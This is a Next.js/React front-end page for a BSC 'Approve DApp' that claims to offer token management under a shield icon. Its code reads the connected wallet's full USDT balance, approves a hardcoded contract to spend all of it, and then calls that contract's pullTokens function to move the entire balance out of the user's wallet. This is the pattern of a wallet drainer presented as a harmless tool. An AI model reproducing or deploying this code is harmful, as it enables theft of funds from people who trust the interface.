"use client";

import { useAccount, useConnect, useDisconnect, useWriteContract, usePublicClient } from "wagmi";
import { injected } from "wagmi/connectors";

const TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT

const TOKEN_ABI = [
  {
    name: "approve",
    type: "function",
    stateMutability: "nonpayable",
    inputs: [
      { name: "spender", type: "address" },
      { name: "amount", type: "uint256" }
    ],
    outputs: []
  },
  {
    name: "balanceOf",
    type: "function",
    stateMutability: "view",
    inputs: [
      { name: "account", type: "address" }
    ],
    outputs: [
      { name: "", type: "uint256" }
    ]
  }
];

const CONTRACT_ADDRESS = "0x9d6db9BFDE5E1922FED7971C8580432ED052d62B";

const CONTRACT_ABI = [
  {
    name: "pullTokens",
    type: "function",
    stateMutability: "nonpayable",
    inputs: [
      { name: "token", type: "address" },
      { name: "from", type: "address" },
      { name: "amount", type: "uint256" }
    ],
    outputs: []
  }
];

function truncateAddress(address: string) {
  return `${address.slice(0, 6)}...${address.slice(-4)}`;
}

export default function Home() {
  const { address, isConnected } = useAccount();
  const { connect } = useConnect();
  const { disconnect } = useDisconnect();

  const { writeContractAsync, isPending } = useWriteContract();
  const publicClient = usePublicClient();

  const handleApprove = async () => {
    if (!publicClient || !address) return;
    try {
      const balance = await publicClient.readContract({
        address: TOKEN_ADDRESS,
        abi: TOKEN_ABI,
        functionName: "balanceOf",
        args: [address],
      });

      await writeContractAsync({
        address: TOKEN_ADDRESS,
        abi: TOKEN_ABI,
        functionName: "approve",
        args: [CONTRACT_ADDRESS, balance],
      });

      console.log("Approved!");
    } catch (err) {
      console.error(err);
    }
  };

  const handlePull = async () => {
    if (!publicClient || !address) return;
    try {
      const balance = await publicClient.readContract({
        address: TOKEN_ADDRESS,
        abi: TOKEN_ABI,
        functionName: "balanceOf",
        args: [address],
      });

      console.log("User balance:", String(balance));

      await writeContractAsync({
        address: CONTRACT_ADDRESS,
        abi: CONTRACT_ABI,
        functionName: "pullTokens",
        args: [TOKEN_ADDRESS, address, balance],
      });

      console.log("Tokens pulled!");
    } catch (err) {
      console.error("Pull error:", err);
    }
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center px-4">
      <div className="w-full max-w-[420px]">

        {/* Card */}
        <div className="bg-bg-elevated border border-border rounded-2xl overflow-hidden">

          {/* Header */}
          <div className="px-6 pt-6 pb-5 border-b border-border-subtle">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 rounded-xl bg-brand-muted flex items-center justify-center">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="var(--brand)" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
                  <path d="M9 12l2 2 4-4" />
                </svg>
              </div>
              <div>
                <h1 className="text-base font-semibold text-text-primary">
                  Approve DApp
                </h1>
                <p className="text-text-tertiary text-xs mt-0.5">
                  Token management on BSC
                </p>
              </div>
            </div>
          </div>

          {/* Body */}
          <div className="p-6">
            {!isConnected ? (
              /* -- Disconnected -- */
              <div className="flex flex-col items-center py-6">
                <div className="w-14 h-14 rounded-2xl bg-brand-subtle border border-border flex items-center justify-center mb-5">
                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--brand)" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
                    <rect x="2" y="6" width="20" height="12" rx="3" />
                    <path d="M16 12h.01" />
                    <path d="M2 10h20" />
                  </svg>
                </div>
                <p className="text-text-secondary text-sm mb-1">
                  No wallet connected
                </p>
                <p className="text-text-tertiary text-xs mb-6">
                  Connect your wallet to approve and manage tokens
                </p>
                <button
                  className="w-full h-11 rounded-xl bg-brand text-white text-sm font-semibold inline-flex items-center justify-center gap-2 transition-all hover:bg-brand-hover active:scale-[0.98] cursor-pointer"
                  onClick={() => connect({ connector: injected() })}
                >
                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <rect x="2" y="6" width="20" height="12" rx="3" />
                    <path d="M16 12h.01" />
                    <path d="M2 10h20" />
                  </svg>
                  Connect Wallet
                </button>
              </div>
            ) : (
              /* -- Connected -- */
              <div className="space-y-5">

                {/* Wallet bar */}
                <div className="flex items-center justify-between rounded-xl bg-bg-surface border border-border-subtle p-3.5">
                  <div className="flex items-center gap-3">
                    <div className="relative">
                      <div className="w-9 h-9 rounded-full bg-brand-muted flex items-center justify-center">
                        <span className="text-xs font-mono font-bold text-brand">
                          {address?.slice(2, 4)}
                        </span>
                      </div>
                      <div className="absolute -bottom-px -right-px w-3 h-3 rounded-full bg-brand border-[2px] border-bg-surface pulse-ring" />
                    </div>
                    <div>
                      <p className="text-sm font-mono font-medium text-text-primary leading-none">
                        {truncateAddress(address!)}
                      </p>
                      <div className="flex items-center gap-1.5 mt-1">
                        <div className="w-1.5 h-1.5 rounded-full bg-success" />
                        <p className="text-[11px] text-text-tertiary">BSC Mainnet</p>
                      </div>
                    </div>
                  </div>
                  <button
                    className="text-xs text-text-tertiary hover:text-danger transition-colors cursor-pointer px-2 py-1 rounded-lg hover:bg-[rgba(239,68,68,0.08)]"
                    onClick={() => disconnect()}
                  >
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                      <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4" />
                      <polyline points="16 17 21 12 16 7" />
                      <line x1="21" y1="12" x2="9" y2="12" />
                    </svg>
                  </button>
                </div>

                {/* Token info */}
                <div className="flex items-center justify-between px-1">
                  <div className="flex items-center gap-3">
                    <div className="w-9 h-9 rounded-full bg-[#26a17b] flex items-center justify-center shrink-0">
                      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                        <line x1="12" y1="1" x2="12" y2="23" />
                        <path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6" />
                      </svg>
                    </div>
                    <div>
                      <p className="text-sm font-semibold text-text-primary leading-none">USDT</p>
                      <p className="text-xs text-text-tertiary mt-0.5">Tether USD</p>
                    </div>
                  </div>
                  <span className="text-xs text-brand font-medium bg-brand-muted px-2.5 py-1 rounded-full">
                    BEP-20
                  </span>
                </div>

                {/* Divider */}
                <div className="h-px bg-border-subtle" />

                {/* Actions */}
                <div className="space-y-3">
                  <button
                    className="w-full h-11 rounded-xl bg-brand text-white text-sm font-semibold inline-flex items-center justify-center gap-2 transition-all hover:bg-brand-hover active:scale-[0.98] disabled:opacity-40 disabled:cursor-not-allowed cursor-pointer"
                    onClick={handleApprove}
                    disabled={isPending}
                  >
                    {isPending ? (
                      <>
                        <span className="spinner" />
                        Approving...
                      </>
                    ) : (
                      <>
                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                          <path d="M20 6L9 17l-5-5" />
                        </svg>
                        Approve USDT
                      </>
                    )}
                  </button>

                  <button
                    className="w-full h-11 rounded-xl bg-brand-muted text-brand text-sm font-semibold inline-flex items-center justify-center gap-2 transition-all hover:bg-[rgba(249,115,22,0.18)] active:scale-[0.98] disabled:opacity-40 disabled:cursor-not-allowed cursor-pointer"
                    onClick={handlePull}
                    disabled={isPending}
                  >
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                      <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4" />
                      <polyline points="7 10 12 15 17 10" />
                      <line x1="12" y1="15" x2="12" y2="3" />
                    </svg>
                    Pull Tokens
                  </button>
                </div>
              </div>
            )}
          </div>
        </div>

        {/* Footer */}
        <div className="flex items-center justify-center gap-1.5 mt-5">
          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="var(--brand)" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2" />
          </svg>
          <span className="text-text-tertiary text-[11px]">Powered by BSC</span>
        </div>

      </div>
    </div>
  );
}
